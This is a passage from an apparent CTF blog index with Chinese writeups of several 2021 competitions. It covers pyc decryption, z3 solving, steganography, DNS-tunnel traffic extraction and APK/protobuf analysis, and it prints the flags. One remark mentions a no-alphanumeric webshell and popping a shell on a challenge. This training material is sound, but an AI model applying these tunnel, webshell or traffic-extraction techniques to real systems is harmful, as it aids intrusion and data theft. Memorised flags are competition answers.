107, 66, 101, 0x6F, 51, 97, 33, 66, 97, 0x75, 51, 0x74, 51, 97, 0x40, 89, 107, 98, 51, 69, 0x40, 73, 0x5F, 0x30, 85, 0x74, 0x30, 97] a='314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360726024914127372458700660631558817488152092096282925409171536436789259036' b=[] for i in range(0,len(a),2): b.append(int(a[i:i+2])) c='' for i in b: c+=bin(i)[2:].rjust(8,'0') d=[] for i in range(0,len(c),5): d.append(int('1'+c[i:i+5],2)-0x20) print(len(d)) print(len(c)) print(len(ma)) flag=[] for i in range(32): flag.append(0xff) for i in range(len(ma)): flag[d[i]]=ma[i] print(flag) flag1='' for i in flag: flag1+=chr(i) print(\"flag{\"+flag1+\"}\")","path":"2021/10/26/CTF_2021qiangwangnitai/"},{"title":"CTF | 2021 网信柏鹭杯 WriteUp","text":"前言 2021年“网信柏鹭杯”大学生网络空间安全精英赛 比赛时间：2021年10月24日 9:00 - 17:00 重要！2021年“网信柏鹭杯”大学生网络空间安全精英赛延期通知 这个比赛怎么说好呢，按往年来说，只有一场比赛，没有线上预选赛，直接线下比一场那种，看起来也比较水吧。（当然去年因为疫情线上了 原计划是于2021年9月13日在厦门举办，结果经大赛组委会决定，延期至10月中旬比赛，报名截止时间延长至9月26日，比赛也变成线上的了。 于是那时候学弟学妹们都报好名了，后来一看时间又延长了，咱就拉上俩佛系队友组了个队，来水一水好了。 结果比赛前两三天队友收到短信通知加wx，说了部分比赛信息，才知道是这周日比赛，离大谱了…… 反正大家都很佛系，而且这周末比赛太多了，导致最后只有喵喵自己做了几题出来，唉，喵喵菜菜，喵呜呜（ 签到题浏览器访问会 30x 跳转，于是直接 curl MiscMisc1 先拿 Photoshop 修复一波，可以用那个 内容识别填充，高度再稍微复制粘贴加大一点方便扫码。 扫码得到压缩包密码 8521457896541 蜜雪冰城？！ 文件打开发现长度贼大，很明显有零宽隐写，拿到 vim 下看一看。 拿 python set 统计一下，发现包含了 {'\\u200b', '\\u200c', '\\u200d', '\\u202a', '\\u202c', '\\u202d', '包', '压', '在', '密', '就', '码', '缩', '这', '里', '\\ufeff'} 然后去 零宽隐写 解密，得到一个 mp3 或者 这个 也行，发现还更新了个 UI（ 播放发现是 DTMF，内容是 399#9311233212 解压 flag.7z 拿到 flag flag{ISEC-45rd4r8f4rq6h5y8u2v1x4f5y9i5afde} Reversebaby_python首先确认这个 exe 是用 pyinstaller 打包的，版本是 python 3.7 参考 [CISCN2021]华北区_ctf_re_imnotavirus 用 pyinstxtractor 把 exe 逆向回 pyc PyInstaller Extractor is a Python script to extract the contents of a PyInstaller generated Windows executable file. The contents of the pyz file (usually pyc files) present inside the executable are also extracted. The header of the pyc files are automatically fixed so that a Python bytecode decompiler will recognize it. The script can run on both Python 2.x and 3.x. Pyinstaller versions 2.0, 2.1, 3.0, 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 4.0, 4.1, 4.2, 4.3, 4.4, 4.5, 4.5.1 are tested &amp; supported. Probably will work with other versions too. python pyinstxtractor.py baby.exe 然而通过提示信息可以发现这些 pyc 都加密了。 然后进入 baby.exe_extracted 文件夹，反编译 pyimod02_archive.pyc uncompyle6 pyimod02_archive.pyc &gt; pyimod02_archive.py 同理，反编译 baby.pyc 得到主函数逻辑，调用了 baby_python.baby_core。 在这个 pyimod02_archive.py 基础上解密核心的数据校验部分代码，也就是 PYZ-00.pyz_extracted\\baby_python\\baby_core.pyc.encrypted 这个文件。 在 pyimod02_archive.py 文件最后面写入 inf = open(r'PYZ-00.pyz_extracted\\baby_python\\baby_core.pyc.encrypted', 'rb') c = Cipher() buf = c.decrypt(inf.read()) buf = zlib.decompress(buf) # 查看这个代码文件能发现密文是用zlib压缩过的所以需要解压缩 out = open(r'PYZ-00.pyz_extracted\\baby_python\\baby_core.pyc', 'wb') out.write(buf) print('written down %d bytes' % len(buf)) inf.close() out.close() 然后运行，得到解密后的 pyc。 参考 struct.pyc 头部16bytes，给这个 baby_core.pyc 补上 magic number 等信息。 然后反编译这个 pyc，得到 py 源代码。 uncompyle6 baby_core.pyc &gt; baby_core.py # uncompyle6 version 3.7.4 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.7.3 (default, Mar 27 2019, 17:13:21) [MSC v.1915 64 bit (AMD64)] # Embedded file name: baby_python\\baby_core.py # Compiled at: 1995-09-28 00:18:56 # Size of source mod 2**32: 272 bytes import hashlib def md5(s: bytes) -&gt; str: m = hashlib.md5() m.update(s) return m.hexdigest().lower() def main(): secret = input('secret: ') if len(secret) != 48: return else: return secret.isnumeric() or None values = [] for i in range(0, 48, 3): values.append(int(secret[i:i + 3])) co = [[158, 195, 205, 229, 213, 238, 211, 198, 190, 226, 135, 119, 145, 205, 113, 122], [ 234, 256, 185, 253, 244, 134, 102, 117, 190, 106, 131, 205, 198, 234, 162, 218], [ 164, 164, 209, 200, 168, 226, 189, 151, 253, 241, 232, 151, 193, 119, 226, 193], [ 213, 117, 151, 103, 249, 148, 103, 213, 218, 222, 104, 228, 100, 206, 218, 177], [ 217, 202, 126, 214, 195, 125, 144, 105, 152, 118, 167, 137, 171, 173, 206, 240], [ 160, 134, 131, 135, 186, 213, 146, 129, 125, 139, 174, 205, 177, 240, 194, 181], [ 183, 213, 127, 136, 136, 209, 199, 191, 150, 218, 160, 111, 191, 226, 154, 191], [ 247, 188, 210, 219, 179, 204, 155, 220, 215, 127, 225, 214, 195, 162, 214, 239], [ 108, 112, 104, 133, 178, 138, 110, 176, 232, 124, 193, 239, 131, 138, 161, 218], [ 140, 213, 142, 181, 179, 173, 203, 208, 184, 129, 129, 119, 122, 152, 186, 124], [ 105, 205, 124, 142, 175, 184, 234, 119, 195, 218, 141, 122, 202, 202, 190, 178], [ 183, 178, 256, 124, 241, 132, 163, 209, 204, 104, 175, 211, 196, 136, 158, 210], [ 224, 144, 189, 106, 177, 251, 206, 163, 167, 144, 208, 254, 117, 253, 100, 106], [ 251, 251, 136, 170, 145, 177, 175, 124, 193, 188, 193, 198, 208, 171, 151, 230], [ 143, 200, 143, 150, 243, 148, 136, 213, 161, 224, 170, 208, 185, 117, 189, 242], [ 234, 188, 226, 194, 248, 168, 250, 244, 166, 106, 113, 218, 209, 220, 158, 228]] r = [ 472214, 480121, 506256, 449505, 433390, 435414, 453899, 536361, 423332, 427624, 440268, 488759, 469049, 484574, 480266, 522818] for i in range(16): v = 0 for j in range(16): v += co[i][j] * values[j] if v != r[i]: return print('flag{ISEC-%s}' % md5(secret.encode())) # okay decompiling baby_core.pyc 可以看出，输入的数字为48位，三位三位将转成 values 数组，做了个矩阵求解，判断结果是否与 r 相符。 那其实就是要求这个矩阵的系数 values 了，最后拿 z3 solver 一把梭 就完事了~ from z3 import * import hashlib def md5(s: bytes) -&gt; str: m = hashlib.md5() m.update(s) return m.hexdigest().lower() co = [[158, 195, 205, 229, 213, 238, 211, 198, 190, 226, 135, 119, 145, 205, 113, 122], [ 234, 256, 185, 253, 244, 134, 102, 117, 190, 106, 131, 205, 198, 234, 162, 218], [ 164, 164, 209, 200, 168, 226, 189, 151, 253, 241, 232, 151, 193, 119, 226, 193], [ 213, 117, 151, 103, 249, 148, 103, 213, 218, 222, 104, 228, 100, 206, 218, 177], [ 217, 202, 126, 214, 195, 125, 144, 105, 152, 118, 167, 137, 171, 173, 206, 240], [ 160, 134, 131, 135, 186, 213, 146, 129, 125, 139, 174, 205, 177, 240, 194, 181], [ 183, 213, 127, 136, 136, 209, 199, 191, 150, 218, 160, 111, 191, 226, 154, 191], [ 247, 188, 210, 219, 179, 204, 155, 220, 215, 127, 225, 214, 195, 162, 214, 239], [ 108, 112, 104, 133, 178, 138, 110, 176, 232, 124, 193, 239, 131, 138, 161, 218], [ 140, 213, 142, 181, 179, 173, 203, 208, 184, 129, 129, 119, 122, 152, 186, 124], [ 105, 205, 124, 142, 175, 184, 234, 119, 195, 218, 141, 122, 202, 202, 190, 178], [ 183, 178, 256, 124, 241, 132, 163, 209, 204, 104, 175, 211, 196, 136, 158, 210], [ 224, 144, 189, 106, 177, 251, 206, 163, 167, 144, 208, 254, 117, 253, 100, 106], [ 251, 251, 136, 170, 145, 177, 175, 124, 193, 188, 193, 198, 208, 171, 151, 230], [ 143, 200, 143, 150, 243, 148, 136, 213, 161, 224, 170, 208, 185, 117, 189, 242], [ 234, 188, 226, 194, 248, 168, 250, 244, 166, 106, 113, 218, 209, 220, 158, 228]] r = [ 472214, 480121, 506256, 449505, 433390, 435414, 453899, 536361, 423332, 427624, 440268, 488759, 469049, 484574, 480266, 522818] s = Solver() values = [Int('v%d' % i) for i in range(16)] for i in range(16): v = 0 for j in range(16): v += co[i][j] * values[j] s.add(v == r[i]) for j in range(16): s.add(values[j] &gt; 0) s.check() answer = s.model() print(answer) # [v13 = 103, v9 = 109, v12 = 152, v14 = 124, v10 = 244, v2 = 188, v0 = 113, v3 = 123, v15 = 165, v6 = 154, v7 = 241, v4 = 164, v8 = 163, v11 = 215, v1 = 201, v5 = 176] result = \"\".join([str(answer[each]) for each in values]) print(result) # 113201188123164176154241163109244215152103124165 len(result) # 48 print('flag{ISEC-%s}' % md5(result.encode())) # flag{ISEC-ca32ab6174689b5e366241ad58108c68} Extensive Reading: 反编译Python打包的可执行程序 这个用的 archive_viewer.py python逆向实战：反编译pyinstaller打包生成的exe python程序的打包/破解/加密 下面是 Z3 相关，喵喵之前写的 Z3 Introduction 2021 TCTF/0CTF Quals zer0lfsr- 一题 CryptoCrypto2又是一堆编码套娃…… 开局是 十六进制编码 486d65656d727720516372697a716e7a72707a687271207262205a6278656d7163206e767a612072626b206e65727468706d7863615b32362c34352c31362c35362c31375d2c20686d6b7a657420707a7872706b7a6b2072712061637a2078707a72617a71612068706d617a70206d622061637a205a6278656d716320657262787372787a2072626b2061637a20687670656b2771206e707a2d7a776d627a6261206b70727772616d71612e437a206d71207675617a62206a7265657a6b205a62786572626b2771206272616d76627265206e767a612072626b2061637a20224472706b2076752052677662225b382c32302c33382c31322c37322c34322c332c365d2e436d7120717370676d676d62782068767069712c206d626a65736b6d6278207176777a206a7665657264767072616d7662712c206a7662716d7161207675207264767361203338206e657274712c717662627a61712c206168762065766278206272707072616d677a206e767a77712c2072626b20717a677a707265207661637a70206e767a77712e20436d71206e65727471206372677a20647a7a622061707262716572617a6b206d626176207a677a70742077726c767020656d676d627820657262787372787a2072626b2072707a206e7a70757670777a6b207776707a207675617a62206163726220616376717a20767520726274207661637a70206e65727468706d7863615b31302c36322c31322c35392c332c33382c35312c34352c342c31342c34312c31335d2e0a516372697a716e7a72707a2068727120647670622072626b2070726d717a6b206d622051617072617576706b2d736e76622d526776622e2041637a20697a74206d712076622061636d7120716172787a2e2052612061637a2072787a2076752031382c20637a20777270706d7a6b205262627a2043726163726872742c20686d6163206863767720637a2063726b206163707a7a206a636d656b707a623a20517371726262722c2072626b2061686d627120437277627a612072626b204c736b6d61632e20447a61687a7a6220313538352072626b20313539322c20637a20647a78726220722071736a6a7a7171757365206a72707a7a705b34312c34332c32322c35342c31322c34322c33332c35312c385d206d62204576626b766220727120726220726a6176702c2068706d617a702c2072626b206e727061207668627a702076752072206e6572746d6278206a76776e726274206a7265657a6b2061637a204576706b204a637277647a7065726d62277120577a622c206572617a702069627668622072712061637a20496d6278277120577a622e2041637a20756572782074767320627a7a6b206d7120637a707a3a615474486c545369587a4961677a7351596970684d446467635566616d765a554a444c634d7441427672553d3d2e20437a20726e6e7a727071206176206372677a20707a616d707a6b2061762051617072617576706b2072707673626b20313631332c2068637a707a20637a206b6d7a6b206163707a7a20747a727071206572617a702e20557a6820707a6a76706b7120767520516372697a716e7a72707a2771206e706d6772617a20656d757a20717370676d677a2c2072626b2061637a707a2063727120647a7a62206a7662716d6b7a707264657a20716e7a6a736572616d76622072647673612071736a6320777261617a707120727120636d71206e6374716d6a726520726e6e7a727072626a7a2c20717a667372656d61742c20707a656d786d76737120647a656d7a75712c2072626b2068637a61637a702061637a20687670697120726161706d6473617a6b20617620636d7720687a707a2068706d61617a62206474207661637a70715b31362c34332c33312c332c35342c31322c33332c31352c35395d2e 转 ASCII Hmeemrw Qcrizqnzrpzhrq rb Zbxemqc nvza rbk nerthpmxca[26,45,16,56,17], hmkzet pzxrpkzk rq acz xpzrazqa hpmazp mb acz Zbxemqc erbxsrxz rbk acz hvpek'q npz-zwmbzba kprwramqa.Cz mq vuazb jreezk Zbxerbk'q bramvbre nvza rbk acz \"Drpk vu Rgvb\"[8,20,38,12,72,42,3,6].Cmq qspgmgmbx hvpiq, mbjeskmbx qvwz jveerdvpramvbq, jvbqmqa vu rdvsa 38 nertq,qvbbzaq, ahv evbx brppramgz nvzwq, rbk qzgzpre vaczp nvzwq. Cmq nertq crgz dzzb aprbqerazk mbav zgzpt wrlvp emgmbx erbxsrxz rbk rpz nzpuvpwzk wvpz vuazb acrb acvqz vu rbt vaczp nerthpmxca[10,62,12,59,3,38,51,45,4,14,41,13]. Qcrizqnzrpz hrq dvpb rbk prmqzk mb Qaprauvpk-snvb-Rgvb. Acz izt mq vb acmq qarxz. Ra acz rxz vu 18, cz wrppmzk Rbbz Cracrhrt, hmac hcvw cz crk acpzz jcmekpzb: Qsqrbbr, rbk ahmbq Crwbza rbk Lskmac. Dzahzzb 1585 rbk 1592, cz dzxrb r qsjjzqquse jrpzzp[41,43,22,54,12,42,33,51,8] mb Evbkvb rq rb rjavp, hpmazp, rbk nrpa vhbzp vu r nertmbx jvwnrbt jreezk acz Evpk Jcrwdzpermb'q Wzb, erazp ibvhb rq acz Imbx'q Wzb. Acz uerx tvs bzzk mq czpz:aTtHlTSiXzIagzsQYiphMDdgcUfamvZUJDLcMtABvrU==. Cz rnnzrpq av crgz pzampzk av Qaprauvpk rpvsbk 1613, hczpz cz kmzk acpzz tzrpq erazp. Uzh pzjvpkq vu Qcrizqnzrpz'q npmgraz emuz qspgmgz, rbk aczpz crq dzzb jvbqmkzprdez qnzjseramvb rdvsa qsjc wraazpq rq cmq nctqmjre rnnzrprbjz, qzfsremat, pzemxmvsq dzemzuq, rbk hczaczp acz hvpiq raapmdsazk av cmw hzpz hpmaazb dt vaczpq[16,43,31,3,54,12,33,15,59]. 然后拿到 quipquip 一把梭 得到这个，发现其实就是 维基百科那个改的。 William Shakespearewas an English poet and playwright[26,45,16,56,17], widely regarded as the greatest writer in the English language and the world's pre-eminent dramatist.He is often called England's national poet and the \"Bard of Avon\"[8,20,38,12,72,42,3,6].His surviving works, including some collaborations, consist of about 38 plays,sonnets, two long narrative poems, and several other poems. His plays have been translated into every major living language and are performed more often than those of any other playwright[10,62,12,59,3,38,51,45,4,14,41,13]. Shakespeare was born and raised in Stratford-upon-Avon. The key is on this stage. At the age of 18, he married Anne Hathaway, with whom he had three children: Susanna, and twins Hamnet and Judith. Between 1585 and 1592, he began a successful career[41,43,22,54,12,42,33,51,8] in London as an actor, writer, and part owner of a playing company called the Lord Chamberlain's Men, later known as the King's Men. The flag you need is here:tYyWjYUkGeKtveuSZkrwIBbvhFxtioEFCBJhIyTNoaF==. He appears to have retired to Stratford around 1613, where he died three years later. Few records of Shakespeare's private life survive, and there has been considerable speculation about such matters as his physical appearance, sexuality, religious beliefs, and whether the works attributed to him were written by others[16,43,31,3,54,12,33,15,59]. 这串说的 flag 好像 base64 啊，然而发现偏移都不对。 又发现去掉 == 之后长度为 43，而这些数组合起来的元素个数也是 43，寻思着存在某种映射。但是一想最大值 72，不可能是改 base64 表了。 摸不着头脑.jpg 后来队友想了个半天也没想出来，摸了。 赛后才知道，是 逐位异或 啊，草了啊啊啊啊啊啊！喵呜呜。 Exp: s = \"tYyWjYUkGeKtveuSZkrwIBbvhFxtioEFCBJhIyTNoaF\" l = [26,45,16,56,17,8,20,38,12,72,42,3,6,10,62,12,59,3,38,51,45,4,14,41,13,41,43,22,54,12,42,33,51,8,16,43,31,3,54,12,33,15,59] r = '' for k, v in enumerate(s): r += chr(ord(v) ^ l[k]) print(r) # ntio{QAMK-awpoK_ahTDdFl_eoSb_cogpJZCVzbBNn} 接着对每个字母循环移位一下就完事了。（经典凯撒 flag{ISEC-sohgC_szLVvXd_wgKt_ugyhBRUNrtTFf} 小结摸了，这个比赛的前一天在打强网拟态防御那个比赛，不说别的，被 sb Misc 题目的 sb 出题人折磨了一晚上，难受死了。（你搁着和咱玩拟态呢 然后寻思着群友都在看 hackergame，就来瞄了眼，水了几题到了第37，于是天亮了。 睡一觉起来发现队友也摸了，那就佛系看这个比赛了…… 于是乎一个队友全程摸了，另一个队友解了半天 crypto 都没解出来，佛了。 然而赛后其他师傅说前两个 crypto 都是原题。。 这次倒是第一次看这种加密的 pyc 逆向，感觉还是有点意思的。 Misc 剩下的三道题全是 apk，要逆向再解，佛了。 还看了个 web，然而喵喵没打通。这是之前一个比赛的原题改的，第一步是个 SSRF，噢，可以参考 [LCTF]bestphp’s revenge，或者 LCTF2018-bestphp's revenge 详细题解。只不过把内层的 flag.php 改成了从本地访问的木马，且过滤了字母数字，拿无字母数字 webshell 打一下就行。 赛后其他师傅说这题靶机没有 bash nc 这些，可以通过构造管道把 shell 弹出来，最后读 phpinfo 之类的好像。（环境关了也复现不了了 总之吧，题目还是有点难度的，不过可能是这周比赛太多了，打的师傅不算多。咱也就摸摸鱼看看题罢了。 就这样吧。 （溜了溜了喵","path":"2021/10/25/CTF_2021bailu/"},{"title":"CTF | 2021 ByteCTF Misc Writeup","text":"引言 第三届字节跳动“安全范儿”高校挑战赛正式开启，赛事由字节跳动安全与风控团队发起并主办，分为ByteCTF和安全AI挑战赛两个赛道，同时有“安全范儿”沙龙辅助引领，全面促进高校网络安全新力量的挖掘、提升和激励。 ByteCTF 赛道的比赛形式为CTF解题赛，赛题包含Web、Pwn、Reversing、Crypto、Mobile、Misc等多种题型，赛题与字节跳动产品业务相结合，给同学们营造字节跳动攻防场景的沉浸式体验。 线上初赛时间：2021年10月16日-17日 https://2021bytectf.xctf.org.cn/ 发现好久没水博客了，之前有几篇咕掉了，喵喵要上课要搬砖啊，喵呜…… 噢，这周末 ByteCTF 来了，那就来摸鱼打一打吧！ 这篇就写几题 Misc 方向的吧，有的还是赛后复现的，这比赛太顶啦！ Checkin 字节跳动安全系列活动主题名字是什么？你造吗？关注【字节跳动安全中心】公众号并回复本次大赛主题（4字），会有意外惊喜！ 发 安全范儿 Survey填问卷 HearingNotBelieving Hearing is not believing https://2021bytectf-g.xctf.org.cn/media/uploads/task/a1fe791c76c245279317da2230fdc639.zip 解压出来一个 wav，一看频谱，很明显前半段有个二维码。 拼成一个二维码，然后手撸一下 m4yB3_ 后半段是 SSTV，又想到 喵喵新年解谜闯关 出过一题包含 SSTV 的了（ 一共有好几张图，拼成一张图，里面有个二维码 然后再手撸一下…… U_kn0W_S57V} 得到 flag ByteCTF{m4yB3_U_kn0W_S57V} frequently Someone wants to send secret information through a surreptitious channel. Could you intercept their communications? https://2021bytectf-g.xctf.org.cn/media/uploads/task/27bf98ffacef41d6b605fe2534b0a2ab.zip 一个流量包 这堆 dns 查询的域名感觉有戏 找一下发现.bytedanec.top的dns隧道流量。 dns &amp;&amp; dns.qry.name contains \"bytedanec.top\" &amp;&amp; ip.src == 10.2.173.238 有戏了！ 这个导出 json import base64 import json with open('dns.json', 'r', encoding='utf-8') as fin: s = fin.read() data_raw0 = json.loads(s) data_raw = sorted( data_raw0, key=lambda x: x['_source']['layers']['frame']['frame.time_epoch']) data_extract = '' for d in data_raw: queries = d['_source']['layers']['dns']['Queries'] for i in queries: x = queries[i][\"dns.qry.name\"].split('.')[0] print(x) if x not in 'io': data_extract += x print(data_extract) data_decode = base64.b64decode(data_extract) with open('decode.png', 'wb') as fout: fout.write(data_decode) （后来发现还不如直接导出 CSV，然后删除冗余信息，复制粘贴到 CyberChef 处理。。 然后发现改来改去都不对，这解析出来的 png 图片怎么都是损坏的，虽然说勉强能看到点东西，但感觉哪里锅了啊…… 后来才想到应该是有丢包导致重传，所以源地址为发包机器的时候可能会存在冗余的，那就换成 8.8.8.8 返回的就好了吧。 dns &amp;&amp; dns.qry.name contains \"bytedanec.top\" &amp;&amp; ip.src == 8.8.8.8 出来也不大对劲，但能大概看到说 You find the DNS tunnel. 然后队友说去重之后出了正常的图…… 就是比如这种 Transaction ID 相同的，很明显是重复的了。 或者也可以拿 tshark 导出，然后匹配字符串来处理 tshark -T fields -r frequently.pcap -e dns.qry.name -e dns.id &gt; 1.txt 观察发现base64编码的数据返回的a记录都是10.0.0.1，o和i的返回a记录都是10.0.0.2。 单独看 i o 提取o i，发现刚好为 360 个，转为 01 然后转 ascii 得到前半段 flag dns &amp;&amp; dns.qry.name matches \"^[io].bytedanec.top\" &amp;&amp; ip.src == 8.8.8.8 The first part of flag: ByteCTF{^_^enJ0y&amp;y0ur 后半段 udp.stream eq 1 得到另一半 flag 最后得到 ByteCTF{^_^enJ0y&amp;y0urse1f_wIth_m1sc^_^} Lost Excel Please find out who leaked this document asap https://2021bytectf-g.xctf.org.cn/media/uploads/task/41f3f4157b1a43ebb7baf662fc9b5604.zip HInt: Block size = 8. Notice repeating patterns. Excel 里的这个背景图片有猫腻。 LSB 有奇奇怪怪的隐写。 R0 G0 B0 都是一样的，提取一份出来。 每个方块占 4*4 pixel，很明显图里的信息是冗余的，或者说是有大量相同规律重复的色块。 比赛的时候盲猜这是 0 1 二进制编码，然而导出来发现啥也不是。 后来咱都想不出来这是啥了…… 赛后问了其他师傅，说是四进制编码，绝了。难道他每个方块占 4*4 pixel 有这个提示作用吗（ 噢，Block size = 8 指的是 8pixel 啊！ 也就是说类似于下面这样，8*8pixel 作为一个小格子，每个格子里只存在5种情况： 全空 左上一个 =&gt; 00 右上一个 =&gt; 01 左下一个 =&gt; 10 右下一个 =&gt; 11 根据位置按照四进制进行编码。 Exp: 这里试了试发现得按照从左到右先读第一行，然后再从上到下读第二行这样。 from Crypto.Util.number import long_to_bytes import numpy as np import matplotlib.pyplot as plt from PIL import Image img = Image.open('red0.png') # img.show() img.size # (615, 607) data = [] result = '' for j in range(0, img.size[1], 8): for i in range(0, img.size[0], 8): pixels = [img.getpixel((i, j)), img.getpixel( (i+4, j)), img.getpixel((i, j+4)), img.getpixel((i+4, j+4))] # print(pixels) s = ''.join([str(x[0]//255) for x in pixels]) # '0010'.index('1') ==&gt; 2 if '1' in s: idx = s.index('1') result += str(idx) data.append(s) # print(data) print() print(result) print(long_to_bytes(int(result, 4))) ByteCTF{ExcelHiddenWM} BabyShark https://2021bytectf-g.xctf.org.cn/media/uploads/task/cb5a835747374f52920e5878de657406.zip （这题喵喵看了看不会做，赛后来复现一下 又是个流量包，刚开始看这一堆 Windowsupdate，盲猜这堆 url 编码里面藏着啥东西。 但队友试了发现没啥东西。 后来发现 tcp.stream eq 0 是一个 adb install xxx.apk 的流量，可以把 apk 抠出来。 根据 ADB 的数据包格式，需要把 WRTE 相关的部分给去除掉。 另外也找到了 ACTF Misc300 抓包 一道题和这部分比较类似，下面是他的官方 wp： https://blog.flanker017.me/wp-content/uploads/2014/04/misc300-official-writeup.pdf 也可以参考 ADB Protocol Documentation (Better documentation of the ADB protocol, specifically for USB uses.) 总之就是要去掉这 24bytes 的数据，提取 payload 部分。 （当然也可以试试上面 wp 里的脚本 虽然文件可能还有点问题，但也能把这个 dex 给解压出来了。 然后直接进行一个逆向。 package com.bytectf.misc1; import android.os.Build.VERSION; import android.os.Bundle; import android.os.Environment; import android.os.StrictMode; import android.os.StrictMode.ThreadPolicy.Builder; import androidx.appcompat.app.AppCompatActivity; import androidx.core.app.ActivityCompat; import dalvik.system.DexClassLoader; import java.io.File; import java.io.IOException; import java.lang.reflect.Method; import okhttp3.Call; import okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Request.Builder; import okhttp3.Response; import okhttp3.ResponseBody; public class MainActivity extends AppCompatActivity { public long getAESKey(byte[] paramArrayOfByte, Method paramMethod) { try { paramArrayOfByte = paramMethod.invoke(null, new Object[] { paramArrayOfByte }); long l = ((Long)paramArrayOfByte.getClass().getMethod(\"getKey\", new Class[0]).invoke(paramArrayOfByte, new Object[0])).longValue(); return l; } catch (Exception paramArrayOfByte) { paramArrayOfByte.printStackTrace(); } return -1L; } public String getPBClass() { String str = \"\"; if (ActivityCompat.checkSelfPermission(this, \"android.permission.READ_EXTERNAL_STORAGE\") != 0) { ActivityCompat.requestPermissions(this, new String[] { \"android.permission.READ_EXTERNAL_STORAGE\" }, 1); } else if (ActivityCompat.checkSelfPermission(this, \"android.permission.WRITE_EXTERNAL_STORAGE\") != 0) { ActivityCompat.requestPermissions(this, new String[] { \"android.permission.WRITE_EXTERNAL_STORAGE\" }, 1); } else if (Environment.getExternalStorageState().equals(\"mounted\")) { str = Environment.getExternalStorageDirectory().getAbsolutePath() + \"/PBClass.dex\"; } return str; } public byte[] getPBResp() { Object localObject1 = new byte[0]; OkHttpClient localOkHttpClient = new OkHttpClient(); Object localObject2 = new Request.Builder().url(\"http://192.168.2.247:5000/api\").build(); try { localObject2 = localOkHttpClient.newCall((Request)localObject2).execute().body().bytes(); localObject1 = localObject2; } catch (IOException localIOException) { localIOException.printStackTrace(); } return (byte[])localObject1; } public Class loadPBClass(String paramString) { File localFile = getDir(\"dex\", 0); paramString = new DexClassLoader(new File(paramString).getAbsolutePath(), localFile.getAbsolutePath(), null, getClassLoader()); try { paramString = paramString.loadClass(\"com.bytectf.misc1.KeyPB\").getClasses()[0]; return paramString; } catch (Exception paramString) { paramString.printStackTrace(); } return null; } protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2131427356); if (Build.VERSION.SDK_INT &gt; 9) { StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build()); } paramBundle = loadPBClass(getPBClass()).getMethods()[37]; AesUtil.decrypt(getAESKey(getPBResp(), paramBundle), \"8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1\"); } } 大概的逻辑是： 从 Environment.getExternalStorageDirectory().getAbsolutePath() + \"/PBClass.dex\" 这个文件里加载类 loadClass(\"com.bytectf.misc1.KeyPB\") 请求 http://192.168.2.247:5000/api 这个接口，获得一段 bytes 利用这段 bytes，结合这个类里的方法进行一些处理，获得 AES Key（getAESKey 函数） 利用 AES Key 解密 8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1 于是最后的结果应该就是 flag 了。 那现在就去找这段 bytes，直接看流量里的 /api 部分就完事了。 088bb7bdf5dbd53711a1f831e6d61cc840 其实当时队友已经做到这里了，然而并不知道这个 PB 是啥玩意。。 赛后才知道是 protobuf，看人家队伍经典 fuzz……（摊手 又想到了 CISCN 2021 初赛的 tiny traffic 那题，也接触了 protobuf 然后丢去 赛博厨子 解密一下 得到俩数字 { \"1\": 244837809871755, \"2\": 11671133301835090000 } 根据源码可以看出这个就是 AesUtil.decrypt 函数的参数 paramLong，于是应该取的是 244837809871755。 另外参考官方 wp，也可以用 python 库blackboxprotobuf进行解析。 data = b'\\x08\\x8b\\xb7\\xbd\\xf5\\xdb\\xd5\\x37\\x11\\xa1\\xf8\\x31\\xe6\\xd6\\x1c\\xc8\\x40' blackboxprotobuf.decode_message(data) &gt;&gt;&gt; ({'1': 244837809871755, '2': 4668012723080132769}, {'1': {'type': 'int', 'name': ''}, '2': {'type': 'fixed64', 'name': ''}}) 然后回去解密就完事了。 AES/CFB/NoPadding （可恶，怎么你们都会 Java 啊，呜呜呜 import com.bytectf.misc1.AesUtil; public class exp { public static void main(final String[] args) { final String flag = AesUtil.decrypt(244837809871755L, \"8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1\"); System.out.println(flag); } } 就这样吧（ 小结字节和心脏只有一个能跳动（ 太顶了啊！ 有意思的是周六去给新生做 CTF 宣讲，喵喵现场就在看这个 CTF，23333。 最后喵喵被队友带飞，咱进前十了啊！ 看咱有没有机会去线下决赛旅游了 （线下推迟了，疫情好烦啊，喵呜呜 官方 writeup 也出来了，好耶！ 2021 ByteCTF 初赛部分题目官方Writeup 可恶的部分 wp，由于线下赛还有所以初赛这里不放 wp 了？？？ （溜了溜了喵","path":"2021/10/19/CTF_2021ByteCTF/"},{"title":"CTF | 2021 第五空间网络安全大赛线上赛 Misc WriteUp","text":"引言 2021 第三届“第五空间”网络安全大赛 比赛时间：2021-09-16 09:00 ~ 2021-09-16 21:00 https://5space.360.net/ 喵呜，要上课啊，烦烦，只能在上课和搬砖的闲暇时间摸鱼打打比赛了。 这个 第五空间 CTF 比赛时间还安排在周四，不是周末，看了眼 Web 发现已经被队友 AK 了，只能随意看看 Misc 题好了。 貌似好久没水文章了，那这就是一篇水文，只有三道 Misc，大家随意看看就完事了。 Misc签到题flag{welcometo5space} alpha10foremost 提取出来两张图片 png 明显比 jpg 多了些噪声，sub 看一下 结合题目名字 alpha10 猜想是盲水印，alpha 是参数。 然后又想起 喵喵的牛年解谜闯关 就出过一题盲水印的（ 试了发现是 chishaxie 的 BlindWaterMark python3 bwmforpy3.py decode 00001404.jpg 00001537.png 1.png --alpha 10 水印里就是 flag flag{XqAe3QzK2ehD5fWv8jfBitPqHUw0} BabyMi给了个 USB 流量，看上去里面包含有文件传输 先用 tshark 导出流量数据 tshark -r usb.pcap -T fields -e usb.capdata &gt; data.txt 然后写个脚本把里面的非空 非全零 （后来觉得好像没必要，不过问题不大） 字符串 unhex 一下，合并为一个文件。 from binascii import unhexlify cnt = 1 with open('data.txt', 'r', encoding='utf-8') as f: while True: line = f.readline() if not line: break line = line.strip() if len(line) &lt;= 1: continue for i in line: if i != b'\\x00': break else: continue d = 